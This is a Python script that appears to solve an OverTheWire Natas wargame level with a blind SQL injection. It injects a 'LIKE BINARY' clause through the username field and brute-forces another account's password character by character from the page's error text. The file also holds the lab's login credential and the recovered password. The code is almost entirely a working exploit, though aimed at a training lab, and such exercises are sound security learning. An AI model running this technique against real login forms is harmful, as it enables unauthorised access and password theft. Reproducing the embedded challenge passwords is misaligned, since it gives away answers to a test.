import requests
import string

symbols = string.printable[:62]
password = ""
char = 0

while True:
	temp_pw = password
	password += symbols[char]
	# SQL: SELECT * from users where username="natas16" AND password LIKE BINARY {ourpw}%
	sql_injection = f"\" AND password LIKE BINARY \"{password}%"
	postdata = {'username': 'natas16' + sql_injection}
	r = requests.post('http://natas15.natas.labs.overthewire.org/?debug=true', data=postdata, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
	
	if "This user doesn't exist." in r.text:
		password = temp_pw
		char += 1
	else:
		char = 0

	if char == 62:
		break

	print(f"Password is: {password}")

# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
